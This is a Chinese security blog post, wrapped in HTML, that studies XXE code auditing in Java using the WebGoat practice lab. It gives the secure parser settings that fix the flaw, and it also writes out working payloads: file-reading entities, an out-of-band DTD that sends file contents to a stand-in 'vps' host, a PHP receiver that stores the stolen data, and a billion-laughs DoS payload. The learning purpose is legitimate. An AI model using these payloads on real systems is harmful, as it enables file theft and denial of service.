@@ -1,0 +1,283 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xxe代码审计 | 土豆妙妙屋</title><meta name="author" content="inyyy"><meta name="copyright" content="inyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="xxe代码审计xxe：xml外部实体注入  漏洞原理：提交恶意xml -&gt; 服务器使用不安全的xml解析器解析 -&gt; 读取服务器本地文件，内网端口，内网文件 前置知识：一：从黑盒角度xxe分为有回显和回显，有回显的利用方式就是利用http，file等协议去探测内网主机和端口，获取文件信息，无回显xxe采用数据外带进行利用 可能存在xxe的接口：可能存在xxe的接口的请求包中的字段可能是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe代码审计">
+<meta property="og:url" content="https://inyyy.github.io/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="土豆妙妙屋">
+<meta property="og:description" content="xxe代码审计xxe：xml外部实体注入  漏洞原理：提交恶意xml -&gt; 服务器使用不安全的xml解析器解析 -&gt; 读取服务器本地文件，内网端口，内网文件 前置知识：一：从黑盒角度xxe分为有回显和回显，有回显的利用方式就是利用http，file等协议去探测内网主机和端口，获取文件信息，无回显xxe采用数据外带进行利用 可能存在xxe的接口：可能存在xxe的接口的请求包中的字段可能是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp">
+<meta property="article:published_time" content="2026-01-01T14:20:20.000Z">
+<meta property="article:modified_time" content="2026-04-21T14:21:54.865Z">
+<meta property="article:author" content="inyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "xxe代码审计",
+  "url": "https://inyyy.github.io/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
+  "image": "https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp",
+  "datePublished": "2026-01-01T14:20:20.000Z",
+  "dateModified": "2026-04-21T14:21:54.865Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "inyyy",
+      "url": "https://inyyy.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://inyyy.github.io/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xxe代码审计',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">土豆妙妙屋</span></a><a class="nav-page-title" href="/"><span class="site-name">xxe代码审计</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">xxe代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-01T14:20:20.000Z" title="发表于 2026-01-01 22:20:20">2026-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-21T14:21:54.865Z" title="更新于 2026-04-21 22:21:54">2026-04-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="xxe代码审计"><a href="#xxe代码审计" class="headerlink" title="xxe代码审计"></a>xxe代码审计</h1><p><strong>xxe：xml外部实体注入</strong> </p>
+<p><strong>漏洞原理：提交恶意xml -&gt; 服务器使用不安全的xml解析器解析 -&gt; 读取服务器本地文件，内网端口，内网文件</strong></p>
+<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="一：从黑盒角度"><a href="#一：从黑盒角度" class="headerlink" title="一：从黑盒角度"></a>一：从黑盒角度</h3><p><strong>xxe分为有回显和回显，有回显的利用方式就是利用http，file等协议去探测内网主机和端口，获取文件信息，无回显xxe采用数据外带进行利用</strong></p>
+<h4 id="可能存在xxe的接口："><a href="#可能存在xxe的接口：" class="headerlink" title="可能存在xxe的接口："></a>可能存在xxe的接口：</h4><p>可能存在xxe的接口的请求包中的字段可能是content-tpye：app….&#x2F;xml或者app…&#x2F;x-www-form-urlencoded(php站点)，也可以手动添加X-Requested-With：XMLHttpRequest字段尝试能否解析，或者可以上传doc&#x2F;xslx&#x2F;ppt文件的功能点</p>
+<h4 id="在java中支持的协议："><a href="#在java中支持的协议：" class="headerlink" title="在java中支持的协议："></a>在java中支持的协议：</h4><p>file&#x2F;netdoc（可以用来读取列目录文件，作用类似ls。file:&#x2F;&#x2F;&#x2F;），http，gopher(适用于jdk1.8以下，写入webshell)，CDATA协议(如果读取的文本数据中包含&lt;和&amp;等特殊符号，一般是不解析会报错，但是这个协议会让xml解析器忽略这部分，这样就能读到)</p>
+<p>采用以下方式将文本数据包含在CDATA部分中：</p>
+<p>String data&#x3D;“&lt;[CDATA[文本数据]]&gt;”;</p>
+<p>准备一个payload，一个dtd文件</p>
+<p>&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;</p>
+<p>&lt;!ENTITY  all “%start;%goodles;%end;”&gt;</p>
+<p>&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;</p>
+<p>&lt;!ENTITY  % goodies SYSTEM “file:&#x2F;&#x2F;&#x2F;文件路劲”&gt;</p>
+<p>&lt;!ENTITY % and “] ]&gt;”&gt;</p>
+<p>&lt;!ENTITY % dtd SYSTEM “<a target="_blank" rel="noopener" href="https://ip/1.dtd%22%3E">https://ip/1.dtd&quot;&gt;</a></p>
+<p>%dtd; ]&gt;</p>
+<p>&lt;root&gt;%all&lt;&#x2F;root&gt;</p>
+<p>注意：但是存在局限性， 特殊符号会被去掉或者错位，无法读出</p>
+<h4 id="盲xxe"><a href="#盲xxe" class="headerlink" title="盲xxe"></a>盲xxe</h4><p>现在基本都不会吧解析结果直接输出，盲xxe可以采用报错(报错型就是多次注入进行猜解)或者外带</p>
+<p>外带：</p>
+<p><strong>第一步：托管dtd，需要一个dtd文件和php文件，php文件用来接收数据和执行恶意指令</strong></p>
+<p>&lt;! ENTITY  %all “&lt;!ENTITY send  SYSTEM “<a target="_blank" rel="noopener" href="http://vps/get.php?file=%25file%22%5C%3E">http://vps/get.php?file=%file&quot;\&gt;</a>“ &gt; (dtd文件)</p>
+<p><strong>get.php</strong></p>
+<?php
+
+$data=$_GET['file'];
+
+$myfile=fopen("file.txt","w+");
+
+fwrite($myfile,$data);
+
+fclose($myfile);
+
+?>
+
+<p><strong>第二部：引用外部dtd，可以先探测一下，随意访问一个文件</strong></p>
+<p>&lt;!DOCTYPE root [ &lt;!ENTITY %a SYSTEM “<a target="_blank" rel="noopener" href="http://vps/test.txt">http://vps/test.txt</a>“ &gt;] %a;] &gt;</p>
+<p>看是否成功请求</p>
+<p><strong>第三步：多步骤外带</strong></p>
+<p>payload：</p>
+<p>&lt;? xml version&#x3D;”1.0” ?&gt;</p>
+<!DOCTYPE any[
+
+\<!ENTITY  % file SYSTEM "file:///C:Windows/win.ini">
+
+<p>&lt;!ENTITY % a SYSTEM “<a target="_blank" rel="noopener" href="http://vps/xxe.dtd">http://vps/xxe.dtd</a>“</p>
+<p>%a;</p>
+<p>%all;</p>
+<p>]&gt;</p>
+<p>&lt;root&gt;&seed;&lt;&#x2F;root&gt;</p>
+<h3 id="二：java常用的xml解析器："><a href="#二：java常用的xml解析器：" class="headerlink" title="二：java常用的xml解析器："></a>二：java常用的xml解析器：</h3><p><strong>1：DomcumentBuilder</strong></p>
+<p><strong>2：SAXReader</strong></p>
+<p><strong>3：SAXParser</strong></p>
+<p><strong>4：XMLInputFactory</strong></p>
+<p><strong>审计时就是看这些解析器有没有禁止dtd和外部实体</strong></p>
+<h3 id="三：简单实例"><a href="#三：简单实例" class="headerlink" title="三：简单实例"></a>三：简单实例</h3><p><strong>不安全写法：</strong></p>
+<p>DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();<br>DocumentBuilder db &#x3D; dbf.newDocumentBuilder(); &#x2F;&#x2F; 没做任何防护<br>Document doc &#x3D; db.parse(input); &#x2F;&#x2F; 直接解析用户输入</p>
+<p>XML解析类没有进行设置就直接解析，正确的做法是生成工厂类后进行xxe漏洞的修复</p>
+<p><strong>安全写法：</strong></p>
+<p>DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</p>
+<p>&#x2F;&#x2F; 下面三行是修复 XXE 的固定代码<br>dbf.setFeature(“<a target="_blank" rel="noopener" href="http://apache.org/xml/features/disallow-doctype-decl">http://apache.org/xml/features/disallow-doctype-decl</a>“, true);<br>dbf.setFeature(“<a target="_blank" rel="noopener" href="http://xml.org/sax/features/external-general-entities">http://xml.org/sax/features/external-general-entities</a>“, false);<br>dbf.setFeature(“<a target="_blank" rel="noopener" href="http://xml.org/sax/features/external-parameter-entities">http://xml.org/sax/features/external-parameter-entities</a>“, false);</p>
+<p>DocumentBuilder db &#x3D; dbf.newDocumentBuilder();<br>Document doc &#x3D; db.parse(input);</p>
+<p>禁用dtd和外部实体</p>
+<h3 id="四：审计关键字"><a href="#四：审计关键字" class="headerlink" title="四：审计关键字"></a>四：审计关键字</h3><p><strong>DomcumentBuidler，SAXReader,SAXParse,XMLInputFactory</strong></p>
+<h3 id="五：实战审计"><a href="#五：实战审计" class="headerlink" title="五：实战审计"></a>五：实战审计</h3><p>1：找入口点，找接口接收 <code>Content-Type: application/xml</code></p>
+<p>2：接受xml格式参数</p>
+<p>3：根据参数追踪到xml解析器</p>
+<p>4：检查是否禁用外部实体，dtd</p>
+<p>5：手工验证</p>
+<h2 id="审计学习："><a href="#审计学习：" class="headerlink" title="审计学习："></a>审计学习：</h2><h3 id="一"><a href="#一" class="headerlink" title="一:"></a>一:</h3><p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260420213609203.png" alt="image-20260420213602089"></p>
+<p>这两个字段就说明可能存在xxe</p>
+<p>测试payload：</p>
+<p>&lt;?xml version&#x3D;”1.0” encoding&#x3D;”utf-8”?&gt;</p>
+<!DOCTYPE any[
+
+\<!ENTITY  js SYSTEM "file:///c:/" >
+
+<p>]&gt;</p>
+<p>&lt;comment&gt;<br>&lt;text&gt;<br>&js;<br>&lt;&#x2F;text&gt;<br>&lt;&#x2F;comment&gt;</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260420221944131.png" alt="image-20260420221944053"></p>
+<p>源码：</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260420222808652.png" alt="image-20260420222808554"></p>
+<p>这里定义了一个内部类Comments，这个类是一个字符串数组类，再往后创建了一个HashMap用于绑定用户和用户评论，在getComments方法里面创建一个评论容器，得到键为用户对应的值，如果评论不为空就添加到Comments这个字符串数组类，然后添加之前的默认评论</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260420224934324.png" alt="image-20260420224934259"></p>
+<p>再往下看到xml的解析方法，这里使用xmlInputFactory解析xml，下面有一个if，开启安全配置会禁止拉取dtd，这里动调是默认 不开启安全配置的</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260420230050934.png" alt="image-20260420230050892"></p>
+<p>所以这里直接就是原生解析xml，存在xxe漏洞，这里即使开启安全配置进入if里面也可能被绕过，因为</p>
+<p><strong>它只限制了禁止拉去外部dtd，本地内联dtd是不受影响的，只禁止下载外部dtd文件，写在xml内部的dtd依旧可以完成漏洞，这里内部dtd+本地实体&#x2F;参数实体都能行，参数实体常用于无回显xxe，经常利用其去加载外部dtd，这里能通过这个限制的原因是这个限制对参数实体的匹配较弱，可以利用参数实体绕过这个禁止加载外部dtd的限制</strong></p>
+<h3 id="二：现代rest框架的xxe陷阱"><a href="#二：现代rest框架的xxe陷阱" class="headerlink" title="二：现代rest框架的xxe陷阱"></a>二：现代rest框架的xxe陷阱</h3><p>在现代rest框架中是默认支持内容协商的，一个接口可能可以接受多种数据格式，比如json，xml，yaml等等，如果相关依赖可以自动开启xml解析器，并且开发者不知道的情况下这种是很有可能存在xxe的，因为默认配置的解析器不安全</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421134117775.png" alt="image-20260421134117645"></p>
+<p>这个数据包的content-type是支持json格式的，但是可以看到他有一个字段是x-Requested-With：XMLHttpRequest这里就可以看出他是支持xml的</p>
+<p>改掉插入内部dtd＋本地实体就行，这里我想试一下根节点大小写敏感问题，看看黑盒时需不需要考虑这个问题，发现是大小写敏感的，看代码是规定了根节点的</p>
+<p>名字，在黑盒时可以根据报错来获取根节点名</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421140501209.png" alt="image-20260421140501160"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421142154185.png" alt="image-20260421142154096"></p>
+<p>可能可以在报错中找到根节点名</p>
+<h3 id="三：xml的dos攻击"><a href="#三：xml的dos攻击" class="headerlink" title="三：xml的dos攻击"></a>三：xml的dos攻击</h3><?xml version="1.0"?>
+
+<p>&lt;!DOCTYPE lolz [<br> &lt;!ENTITY lol “lol”&gt;<br>&lt;!ELEMENT lolz (#PCDATA)&gt;<br> &lt;!ENTITY lol1 “&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;”&gt;<br> &lt;!ENTITY lol2 “&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;”&gt;<br> &lt;!ENTITY lol3 “&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;”&gt;<br> &lt;!ENTITY lol4 “&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;”&gt;<br>\ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><br> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><br> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><br> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><br> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"><br>]&gt;<br><lolz>&lol9;</lolz></p>
+<p>一个根节点，里面包含一个lol9文本，这是一个实体，解析后会变成10个lol8，以此类推会占用大量服务器资源，造成dos</p>
+<h3 id="四：盲xxe"><a href="#四：盲xxe" class="headerlink" title="四：盲xxe"></a>四：盲xxe</h3><p><strong>盲xxe打法：</strong></p>
+<p>先托管一个dtd恶意文件</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421221835512.png" alt="image-20260421221835466"></p>
+<p>第二步：创建一个php文件接受读到的内容</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421221913178.png" alt="image-20260421221913127"></p>
+<p>第三步开启http服务即可</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421151456808.png" alt="image-20260421151456740"></p>
+<p>最后一步就是发包，让服务器去访问恶意dtd，试了一下发现不出网，用它的内置靶场试一下，这里遇到了一个坑，就是怎么也上传不了文件，找了下发现是webgoat的文件结构有问题，将在webwolf-fileserver下的名为用户名的文件改为文件夹就可以了</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421201102244.png" alt="image-20260421201102155"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421212451139.png" alt="image-20260421212450891"></p>
+<p>这里可以看到成功请求，我写了一个字符串实体验证一下实体有没有被调用</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421214340058.png" alt="image-20260421214340011"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421214358723.png" alt="image-20260421214358675"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421215337810.png"></p>
+<p>但是发现dtd里面执行了file这个内部参数实体会爆语法错误，改一下，让他直接大在评论里</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421220400282.png" alt="image-20260421220400236"></p>
+<p>成功列出</p>
+<p>源码：</p>
+<p>盲注的源码</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421221258543.png" alt="image-20260421221258466"></p>
+<p>之前回显的源码：</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260421221443807.png" alt="image-20260421221443733"></p>
+<p>解析逻辑是一样的，区别就是有没有return</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://inyyy.github.io">inyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://inyyy.github.io/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://inyyy.github.io/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://inyyy.github.io" target="_blank">土豆妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/28/xss%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="xss代码审计学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">xss代码审计学习</div></div><div class="info-2"><div class="info-item-1">xss代码审计xss漏洞(跨站脚本漏洞)分为三种： 1：反射型xss，依赖url中的参数，服务器接受参数后没有对参数做完全过滤，直接将参数拼接到jsp代码中返回给浏览器，浏览器进行执行，这种xss是一次性的，进行利用的话需要对网址进行伪装，比如伪装成超链接去诱骗他人 2：dom型 这种xss与服务器无关，完全发生在前端的html代码zhong 3：存储型xss，这种xss漏洞会将恶意代码存入数据库或者文件系统中，服务器一般对数据库和内置文件信任，再次访问时会触发漏洞 一：反射型xss1：  先用探针测试一下时哪个字段，发现是credit card字段  弹窗 源码  这里只检查了filed2字段，将filed1字段直接拼接并输出到浏览器 2：自xss自xss就是需要用户手动输入脚本才能进行触发，无法通过get请求里面的url参数来触发，因为它要求参数在请求体里面，感觉就是post传参，需要输入而已，如果服务器处理前端参数用的是RequestParam注解，还是可以通过get进行，看服务器是否明确要求post 3：DOM 这道题是让找遗留的测试路由，直接看js  在view文件夹找...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">inyyy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/inyyy/inyyy.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">xxe代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E4%BB%8E%E9%BB%91%E7%9B%92%E8%A7%92%E5%BA%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">一：从黑盒角度</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8xxe%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%9A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">可能存在xxe的接口：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8java%E4%B8%AD%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">在java中支持的协议：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2xxe"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">盲xxe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Ajava%E5%B8%B8%E7%94%A8%E7%9A%84xml%E8%A7%A3%E6%9E%90%E5%99%A8%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">二：java常用的xml解析器：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">三：简单实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E5%AE%A1%E8%AE%A1%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.1.4.</span> <span class="toc-text">四：审计关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%AE%9E%E6%88%98%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.5.</span> <span class="toc-text">五：实战审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">审计学习：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E7%8E%B0%E4%BB%A3rest%E6%A1%86%E6%9E%B6%E7%9A%84xxe%E9%99%B7%E9%98%B1"><span class="toc-number">1.2.2.</span> <span class="toc-text">二：现代rest框架的xxe陷阱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Axml%E7%9A%84dos%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">三：xml的dos攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E7%9B%B2xxe"><span class="toc-number">1.2.4.</span> <span class="toc-text">四：盲xxe</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/01/xxe%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="xxe代码审计">xxe代码审计</a><time datetime="2026-01-01T14:20:20.000Z" title="发表于 2026-01-01 22:20:20">2026-01-01</time></div></div><div class="aside-list-item 